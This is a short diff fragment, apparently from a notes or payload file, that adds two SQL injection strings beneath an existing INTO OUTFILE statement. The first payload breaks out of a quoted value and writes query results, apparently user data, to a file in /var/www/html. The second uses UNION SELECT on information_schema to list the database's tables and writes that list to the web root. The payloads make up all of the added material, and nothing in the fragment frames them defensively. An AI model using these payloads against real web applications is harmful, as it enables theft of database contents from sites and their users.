@@ -47,3 +47,7 @@ INTO OUTFILE '/var/www/html/TEST.csv'
 FIELDS TERMINATED BY ',' 
 ENCLOSED BY '"' 
 LINES TERMINATED BY '\n';
+
+' or null is null INTO OUTFILE '/var/www/html/USERS.txt' #
+
+' or null is not null UNION SELECT null, TABLE_NAME, TABLE_SCHEMA FROM information_schema.TABLES WHERE TABLE_SCHEMA not like 'information_schema' AND TABLE_SCHEMA not like 'mysql' AND TABLE_SCHEMA not like 'performance_schema' INTO OUTFILE '/var/www/html/TABLES.txt' #
